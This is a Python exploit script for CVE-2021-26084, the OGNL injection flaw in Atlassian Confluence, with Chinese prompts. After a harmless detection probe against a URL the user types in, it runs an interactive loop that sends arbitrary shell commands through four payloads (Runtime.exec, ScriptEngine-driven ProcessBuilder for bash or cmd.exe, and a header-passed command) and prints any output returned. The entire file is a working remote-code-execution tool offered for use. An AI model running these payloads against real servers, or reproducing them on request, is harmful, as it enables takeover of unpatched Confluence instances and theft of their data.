#coding: utf-8
import requests
import urllib3
import sys
import re
#CVE-2021-26084:Confluence OGNL
#by p1gzz


urllib3.disable_warnings()
requests.packages.urllib3.disable_warnings()
proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
print('CVE-2021-26084:Confluence OGNL 注入检测')
while True:
    src_url=input('请输入url：')
    url = src_url+'/pages/doenterpagevariables.action'
    paramsPost = {"queryString":"aaa\\u0027+\x23{\\u0022\\u0022[\\u0022class\\u0022]}+\\u0027bbb"}
    headers = {"User-Agent":"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.0","Content-Type":"application/x-www-form-urlencoded"}
    print('正在进行无损检测....')
    try:
        response = requests.post(url, data=paramsPost, headers=headers, verify=False,timeout=20)
        if "aaa{class java.lang.String=null}bbb" in response.text:
            print('无损检测模块发现存在漏洞!!!')
            exp_test=input('输入1回显模式检测，输入2盲打模式检测:')
            if exp_test=='2':
                while True:
                    command=input('请输入要执行的命令:')
                    print('执行POC1盲打模式.....')
                    url1=src_url + "/pages/createpage-entervariables.action"
                    burp0_headers = {"Upgrade-Insecure-Requests": "1",
                                     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
                                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                                     "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9",
                                     "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}
                    burp0_data = {"queryString": "lalalla\\u0027,(linkCreation)(0xd0ff90),\\u0027lalalala",
                                  "linkCreation": "@java.lang.Runtime@getRuntime().exec('" + command + "')"}

                    res1 = requests.post(url1, headers=burp0_headers, data=burp0_data,verify=False,timeout=20)
                    if res1.status_code == 200 or res2.status_code==403:
                        print('使用POC1发送命令成功~')
                    else:
                        print('使用POC1发送命令失败~')
                    print('执行POC2盲打模式.....')

                    url2 = src_url + "/pages/doenterpagevariables.action"
                    burp2_headers = {"User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.0",
                                     "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "close",
                                     "Content-Type": "application/x-www-form-urlencoded"}
                    burp2_data = {
                        "queryString": "kkk\\u0027+#{\\u0022\\u0022[\\u0022class\\u0022].forName(\\u0022javax.script.ScriptEngineManager\\u0022).newInstance().getEngineByName(\\u0022js\\u0022).eval(\\u0022var x=new java.lang.ProcessBuilder;x.command([\\u0027/bin/bash\\u0027,\\u0027-c\\u0027,\\u0027"+command+"\\u0027]);x.start()\\u0022)}+\\u0027"}
                    res2 = requests.post(url2, headers=burp2_headers, data=burp2_data,verify=False,timeout=20)
                    if res2.status_code == 200 or res2.status_code==403:
                        print('使用POC2发送命令成功~')
                    else:
                        print('使用POC2发送命令失败~')


            elif exp_test=='1':
                while True:
                    command = input('请输入要执行的命令:')
                    print('执行POC3回显检测模式.....')
                    url3 = src_url + "/pages/doenterpagevariables.action"
                    burp3_headers = {"User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.0",
                                     "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "close",
                                     "Content-Type": "application/x-www-form-urlencoded"}
                    burp3_data = {
                        "queryString": "kkk\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022" + command + "\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027"}
                    res3 = requests.post(url3, headers=burp3_headers, data=burp3_data,verify=False,timeout=20)

                    if 'kkk' in res3.text:
                        regex1 = r'value=\"kkk\[([\w\W]*)\]'  # value="kkk
                        exp_result = re.findall(regex1, res3.text)[0]
                        print(exp_result)
                    else:
                        print('POC3无回显结果！')

                    #111
                    print('执行POC4回显检测模式.....')
                    url4 = src_url + "/pages/doenterpagevariables.action"
                    cookies4 = {
                        'JSESSIONID': 'X',
                    }
                    headers4 = {
                        'Connection': 'keep-alive',
                        'Content-Length': '599',
                        'Cache-Control': 'max-age=0',
                        'sec-ch-ua-mobile': '?0',
                        'Upgrade-Insecure-Requests': '1',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-User': '?1',
                        'Sec-Fetch-Dest': 'document',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6',
                        'cmd': command,
                    }
                    data4 = 'queryString=%5Cu0027%2B%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName%28%5Cu0022javax.script.ScriptEngineManager%5Cu0022%29.newInstance%28%29.getEngineByName%28%5Cu0022js%5Cu0022%29.eval%28%5Cu0022var+c%3Dcom.atlassian.core.filters.ServletContextThreadLocal.getRequest%28%29.getHeader%28%5Cu0027cmd%5Cu0027%29%3Bvar+x%3Djava.lang.Runtime.getRuntime%28%29.exec%28c%29%3Bvar+out%3Dcom.atlassian.core.filters.ServletContextThreadLocal.getResponse%28%29.getOutputStream%28%29%3Borg.apache.commons.io.IOUtils.copy%28x.getInputStream%28%29%2Cout%29%3Bout.flush%28%29%3B%5Cu0022%29%7D%2B%5Cu0027'
                    res4=requests.post(url4, headers=headers4, cookies=cookies4, data=data4, verify=False)

                    if res4.status_code == 200 :
                        print(res4.text)
                    else:
                        print('POC4无回显结果！')
                    #111

            else:
                print('我让你输入1或2,你输入的是啥？')
        else:
            print('无损检测模块未发现漏洞')

    except:
        pass
